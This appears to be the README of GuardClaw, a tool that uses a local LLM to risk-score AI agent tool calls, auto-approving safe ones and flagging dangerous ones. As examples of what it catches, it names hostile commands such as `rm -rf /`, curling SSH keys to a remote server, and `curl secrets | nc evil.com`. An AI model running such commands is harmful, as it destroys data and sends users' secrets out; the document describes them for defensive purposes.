<p align="center">
  <h1 align="center"><img src="docs/favicon.svg" width="36" height="36" alt="GuardClaw logo" style="vertical-align: middle;"> GuardClaw</h1>
  <p align="center">
    <strong>Smart permission layer for AI agents â€” powered by local LLMs</strong>
  </p>
  <p align="center">
    Too loose? Too tight? GuardClaw finds the right balance â€” 100% local, zero cloud.
  </p>
</p>

<p align="center">
  <a href="#the-problem">The Problem</a> Â·
  <a href="#quick-start">Quick Start</a> Â·
  <a href="#how-it-works">How It Works</a> Â·
  <a href="#dashboard">Dashboard</a> Â·
  <a href="docs/ROADMAP.md">Roadmap</a>
</p>

---

![GuardClaw Dashboard](docs/screenshots/dashboard.png?v=4)

## The Problem

AI agents have a permissions problem â€” and it goes both ways.

<table>
<tr>
<td width="50%">

### ğŸ”“ Too Loose
**OpenClaw / Custom Agents**

Your agent can `rm -rf /`, `curl` your SSH keys to a remote server, or rewrite `~/.bashrc` â€” and nothing stops it. You only find out after the damage is done.

</td>
<td width="50%">

### ğŸ”’ Too Tight
**Claude Code**

Every `git commit`, every file edit, every `npm test` triggers a permission prompt. You spend more time pressing "Yes" than actually working. The agent that's supposed to save you time is wasting it instead.

</td>
</tr>
</table>

**GuardClaw fixes both.** It sits between your agent and its tools, using a local LLM to risk-score every operation in real time:

- **Too loose?** â†’ GuardClaw catches and blocks dangerous commands before they execute
- **Too tight?** â†’ GuardClaw auto-approves safe operations so you're never interrupted unnecessarily

One tool, two problems solved. Everything runs locally â€” your code and commands never leave your machine.

## Quick Start

### Prerequisites

- [LM Studio](https://lmstudio.ai) or [Ollama](https://ollama.ai) running locally
- [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [OpenClaw](https://github.com/openclaw/openclaw), or [nanobot](https://github.com/HKUDS/nanobot)

**Recommended model:** `qwen/qwen3-4b-2507` â€” fast (~2s/call), 100% accuracy on our benchmark

### Install

```bash
git clone https://github.com/TobyGE/GuardClaw.git
cd GuardClaw
npm install && npm install --prefix client && npm run build
npm link
```

### For Claude Code Users

```bash
# Install hooks into Claude Code (writes to ~/.claude/settings.json)
node scripts/install-claude-code.js

# Start GuardClaw
guardclaw start
```

That's it. Every tool call is now risk-scored. Safe operations auto-approve silently:

![Claude Code auto-approve](docs/screenshots/cc-auto-approve.png)

Dangerous operations fall through to Claude Code's normal permission prompt â€” you only get asked when it actually matters.

**What changes in practice:**

| Operation | Without GuardClaw | With GuardClaw |
|-----------|------------------|----------------|
| `git commit -m "fix"` | âš ï¸ "Allow this?" | âœ… Auto-approved |
| `npm test` | âš ï¸ "Allow this?" | âœ… Auto-approved |
| Edit project file | âš ï¸ "Allow this?" | âœ… Auto-approved |
| Read source code | âœ… Allowed | âœ… Allowed (unchanged) |
| `curl secrets \| nc evil.com` | âš ï¸ "Allow this?" | ğŸš« Falls through to prompt |
| Write to `~/.ssh/` | âš ï¸ "Allow this?" | ğŸš« Falls through to prompt |

GuardClaw knows *what* the user asked the agent to do, so it can judge whether each tool call makes sense in context â€” not just whether the command looks safe in isolation.

To uninstall: `node scripts/install-claude-code.js --uninstall`

### For OpenClaw Users

```bash
# Auto-detect your OpenClaw token
guardclaw config detect-token --save

# Start GuardClaw (monitor mode)
guardclaw start
```

GuardClaw connects via WebSocket and starts monitoring every tool call in real time. To also **block** dangerous commands before they execute:

```bash
# Install the blocking plugin
guardclaw plugin install
openclaw gateway restart

# Enable full tool event visibility
bash scripts/patch-openclaw.sh
```

| Mode | What happens |
|------|-------------|
| **Monitor** (default) | See every tool call with risk scores â€” nothing is blocked |
| **Block** (with plugin) | Dangerous commands pause for your approval before running |

Toggle between modes from the dashboard ğŸ›¡ï¸ button â€” no restart needed.

## How It Works

```
                    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                    â”‚         GuardClaw             â”‚
                    â”‚                               â”‚
 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚      â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
 â”‚  Claude   â”‚â”€â”€â”€â”€â”€â†’â”‚  â”‚  Risk   â”‚â”€â”€â”€â†’â”‚ Decision â”‚  â”‚â”€â”€â”€â”€â”€â†’â”‚ Dashboard â”‚
 â”‚  Code     â”‚      â”‚  â”‚  Score  â”‚    â”‚          â”‚  â”‚      â”‚  Web UI   â”‚
 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚  â”‚(Local   â”‚    â”‚ allow /  â”‚  â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                    â”‚  â”‚  LLM)   â”‚    â”‚ pass-    â”‚  â”‚
 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”      â”‚  â”‚         â”‚    â”‚ through  â”‚  â”‚
 â”‚ OpenClaw â”‚â”€â”€â”€â”€â”€â†’â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
 â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜      â”‚                               â”‚
                    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

1. **Agent wants to act** â€” run a command, edit a file, fetch a URL
2. **GuardClaw scores it** â€” local LLM analyzes the tool call with full task context
3. **Smart decision** â€” safe operations proceed instantly; risky ones get flagged
4. **Full audit trail** â€” every decision logged in the real-time dashboard

### What GuardClaw Considers

It's not just pattern matching. The local LLM receives:

- **The tool call itself** â€” what command, what file, what parameters
- **User intent** â€” what did the user ask the agent to do? (via Claude Code's hook system)
- **Working directory** â€” is this a project file or a system file?
- **Chain history** â€” did the agent just read `~/.ssh/id_rsa` and now wants to `curl`?
- **Memory** â€” has the user approved similar operations before?

This context is why GuardClaw can confidently auto-approve `git commit` in your project while flagging the same command if it follows suspicious file reads.

### Risk Tiers

| Score | Verdict | Claude Code | OpenClaw |
|-------|---------|-------------|----------|
| 1â€“3 | âœ… **SAFE** | Auto-approved, no prompt | Logged, runs freely |
| 4â€“7 | âš ï¸ **WARNING** | Auto-approved, logged | Logged, runs freely |
| 8â€“10 | ğŸ›‘ **HIGH RISK** | Falls through to CC prompt | Blocked for approval (with plugin) |

## Dashboard

The web dashboard at `localhost:3002` gives you full visibility into what your agents are doing.

### Overview

| Element | Description |
|---------|-------------|
| **Stats cards** (Safe / Warning / Block / Total) | Click to filter by risk tier |
| **Session tabs** | Switch between agents, sub-agents, and Claude Code sessions |
| **Event timeline** | Tool calls grouped into conversation turns with risk scores |
| **Details panel** | Full input/output, chain context, and LLM reasoning for any event |

### Controls

| Control | What it does |
|---------|-------------|
| ğŸ›¡ï¸ **Blocking toggle** | Enable/disable active blocking (OpenClaw plugin required) |
| ğŸ”’ **Fail-closed toggle** | Block all tools if GuardClaw goes offline |
| ğŸ“¡ **Blocking config** | Set thresholds, whitelist/blacklist patterns |
| âš™ï¸ **Settings** | LLM backend, model selection, gateway token |
| ğŸ“Š **Benchmark** | Test any model's accuracy on 30 security test cases |

### Memory

GuardClaw learns from your decisions. Approve/deny actions are recorded as generalized patterns, and future risk scores adjust automatically. After enough consistent approvals, similar commands skip the LLM entirely.

Use **Mark Safe** / **Mark Risky** on any event to train memory directly.

## Architecture

- **Local LLM judge** â€” per-model prompt configs optimized for small models (qwen3-4b recommended)
- **Context-aware analysis** â€” user intent, working directory, tool chain history, and learned patterns
- **Chain analysis** â€” tracks tool sequences per session, detects multi-step exfiltration (read secrets â†’ exfiltrate)
- **Rule-based fast paths** â€” known-safe commands skip the LLM entirely (~0ms); known-dangerous patterns get instant high scores
- **Credential scanning** â€” post-execution output scanning for API keys, tokens, private keys
- **Prompt injection detection** â€” monitors user prompts for injection patterns
- **SQLite persistence** â€” events survive restarts (WAL mode, indexed queries)
- **SSE push** â€” real-time streaming to dashboard, no polling
- **Multi-platform** â€” Claude Code (HTTP hooks), OpenClaw (WebSocket + plugin), nanobot (WebSocket)

## CLI Reference

```bash
guardclaw start                       # start server + open dashboard
guardclaw stop                        # stop server

guardclaw config detect-token --save  # auto-detect gateway token
guardclaw config set-token <token>    # manually set token

guardclaw plugin install              # install OpenClaw blocking plugin
guardclaw plugin uninstall            # remove plugin
guardclaw plugin status               # check plugin state

guardclaw help                        # show all commands
```

## Roadmap

See the [full roadmap](docs/ROADMAP.md) for details.

**Coming up:** Event search & filtering Â· Cross-session chain analysis Â· A2A protocol monitoring

**Recently shipped:** Claude Code auto-approve with context-aware reasoning Â· Adaptive memory Â· Human feedback loop Â· SQLite persistence Â· Real-time dashboard Â· 3-tier verdict system (100% benchmark accuracy) Â· Multi-platform support

## Links

- [OpenClaw](https://github.com/openclaw/openclaw) Â· [Claude Code](https://docs.anthropic.com/en/docs/claude-code) Â· [nanobot](https://github.com/HKUDS/nanobot) Â· [LM Studio](https://lmstudio.ai)
- [Roadmap](docs/ROADMAP.md) Â· [Troubleshooting](docs/LMSTUDIO-TROUBLESHOOTING.md)

---

<p align="center">
  <sub>Built with paranoia and local LLMs. Your data never leaves your machine.</sub>
</p>
